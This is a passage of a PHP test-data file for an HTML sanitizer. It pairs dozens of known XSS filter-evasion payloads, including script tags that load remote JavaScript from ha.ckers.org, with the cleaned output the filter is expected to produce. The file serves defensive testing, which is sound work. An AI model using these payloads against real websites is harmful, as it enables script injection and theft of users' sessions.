				'input' => "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",
				'result' => " +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",
				'group' => ''
			),
			'Escaping JavaScript escapes' => array(
				'type' => 'string',
				// Source XML: \&quot;;alert(&apos;XSS&apos;);//
				'input' => "\\\";alert('XSS');//",
				'result' => null,
				'group' => 'page'
			),
			'End title tag' => array(
				'type' => 'string',
				// Source XML: &lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
				'input' => "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
				'result' => "alert(\"XSS\");",
				'group' => ''
			),
			'STYLE w/broken up JavaScript' => array(
				'type' => 'string',
				// Source XML: &lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
				'input' => "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
				'result' => "@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';",
				'group' => ''
			),
			'Embedded Tab' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\"jav  ascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'Embedded Encoded Tab' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'Embedded Newline' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'Embedded Carriage Return' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
				'result' => '',
				'group' => '<IMG />'
			),
			'Multiline w/Carriage Returns' => array(
				'type' => 'string',
				// Source XML: &lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
				'input' => "<IMG\rSRC\r=\r\"\rj\ra\rv\ra\rs\rc\rr\ri\rp\rt\r:\ra\rl\re\rr\rt\r(\r'\rX\rS\rS\r'\r)\r\"\r>\r",
				'result' => '<IMG />',
				'group' => ''
			),
			'Null Chars 1' => array(
				'type' => 'string',
				// Source XML: &apos;print &quot;&lt;IMG SRC=java' . chr(0) . 'script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt;
				'input' => "<IMG SRC=java\000script:alert(\"XSS\")>",
				'result' => '<IMG />',
				'group' => ''
			),
			'Null Chars 2' => array(
				'type' => 'string',
				// Source XML: &apos;print &quot;&amp;&lt;SCR' . chr(0) . 'IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt;
				'input' => "<SCR\000IPT>alert(\"XSS\")</SCR\\0IPT>",
				'result' => "alert(\"XSS\")",
				'group' => ''
			),
			'Spaces/Meta Chars' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apos;XSS&apos;);&quot;&gt;
				'input' => "<IMG SRC=\" &#14; javascript:alert('XSS');\">",
				'result' => '<IMG />',
				'group' => ''
			),
			'Non-Alpha/Non-Digit' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => '',
				'group' => ''
			),
			'Non-Alpha/Non-Digit Part 2' => array(
				'type' => 'string',
				// Source XML: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
				'input' => "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
				'result' => '',
				'group' => ''
			),
			'No Closing Script Tag' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT SRC=http://ha.ckers.org/xss.js
				'input' => "<SCRIPT SRC=http://ha.ckers.org/xss.js",
				'result' => '',
				'group' => ''
			),
			'Protocol resolution in script tags' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
				'input' => "<SCRIPT SRC=//ha.ckers.org/.j>",
				'result' => '',
				'group' => ''
			),
			'Half-Open HTML/JavaScript' => array(
				'type' => 'string',
				// Source XML: &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
				'input' => "<IMG SRC=\"javascript:alert('XSS')\"",
				'result' => '',
				'group' => ''
			),
			'Double open angle brackets' => array(
				'type' => 'string',
				// Source XML: &lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
				'input' => "<IFRAME SRC=http://ha.ckers.org/scriptlet.html <",
				'result' => '',
				'group' => ''
			),
			'Extraneous Open Brackets' => array(
				'type' => 'string',
				// Source XML: &lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
				'input' => "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
				'result' => "alert(\"XSS\");//",
				'group' => ''
			),
			'Malformed IMG Tags' => array(
				'type' => 'string',
				// Source XML: &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
				'input' => "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
				'result' => '',
				'group' => ''
			),
			'No Quotes/Semicolons' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;
				'input' => "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
				'result' => 'a=/XSS/alert(a.source)',
				'group' => ''
			),
			'Evade Regex Filter 1' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => "\" SRC=\"http://ha.ckers.org/xss.js\">",
				'group' => ''
			),
			'Evade Regex Filter 2' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT =\"blah\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => '',
				'group' => ''
			),
			'Evade Regex Filter 3' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT a=\"blah\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => '',
				'group' => ''
			),
			'Evade Regex Filter 4' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => "'\" SRC=\"http://ha.ckers.org/xss.js\">",
				'group' => ''
			),
			'Evade Regex Filter 5' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => "` SRC=\"http://ha.ckers.org/xss.js\">",
				'group' => ''
			),
			'Filter Evasion 1' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => 'document.write("',
				'group' => ''
			),
			'Filter Evasion 2' => array(
				'type' => 'string',
				// Source XML: &lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
				'input' => "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
				'result' => "'>\" SRC=\"http://ha.ckers.org/xss.js\">",
				'group' => ''
			),
			'IP Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://66.102.7.147/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'URL Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Dword Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://1113982867/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Hex Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Octal Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Mixed Encoding' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"h\ntt p://6&#09;6.000146.0x7.147/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Protocol Resolution Bypass' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"//www.google.com/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Firefox Lookups 1' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"//google\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Firefox Lookups 2' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://ha.ckers.org@google\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Firefox Lookups 3' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://google:ha.ckers.org\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Removing Cnames' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://google.com/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Extra dot for Absolute DNS' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://www.google.com./\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'JavaScript Link Location' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
			'Content Replace' => array(
				'type' => 'string',
				// Source XML: &lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
				'input' => "<A HREF=\"http://www.gohttp://www.google.com/ogle.com/\">XSS</A>",
				'result' => '',
				'group' => 'url_obfuscation'
			),
		);
		$tests = array();
		foreach ($cases as $label => $case) {
			// Exclude groups that either make no sense or that we don't have filters for
			if (in_array($case['group'], $excludes)) {
				continue;
			}
			$retKey = isset($case[$retType]) ? $retType : 'result';
			$tests[$label] = array(
				$case['type'],
				$case['input'],
				$case[$retKey] === null ? $case['input'] : $case[$retKey]
			);
		}
		return $tests;
	}

}

?>
